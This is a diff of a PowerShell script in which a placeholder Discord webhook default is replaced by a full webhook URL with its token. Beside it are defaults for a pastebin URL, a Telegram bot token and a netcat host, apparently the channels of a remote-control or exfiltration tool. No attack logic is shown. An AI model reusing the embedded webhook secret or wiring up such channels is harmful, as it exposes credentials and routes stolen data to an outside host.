@@ -3,7 +3,7 @@ Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName Microsoft.VisualBasic
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
-if ($hookurl.Length -eq 0){$hookurl = "https://discord.com/api/webhooks/..."} # Change this to open GUI with your details
+if ($hookurl.Length -eq 0){$hookurl = "https://discordapp.com/api/webhooks/1217564722715693097/219hDUqiKFQ--fOFTVpv23D5igd-zbNYrvrDRvcCdKnF7BXMr93d1KcFvePL8XGPO4TJ"} # Change this to open GUI with your details
 if ($ghurl.Length -eq 0){$ghurl = "https://pastebin.com/raw/......."} # Change this to open GUI with your details
 if ($tg.Length -eq 0){$tg = "Ex4mP137eLeGr4m_4pI-B0t_T0k3N"} # Change this to open GUI with your details
 if ($NCurl.Length -eq 0){$NCurl = "192.168.0.1"} # Change this to open GUI with your details
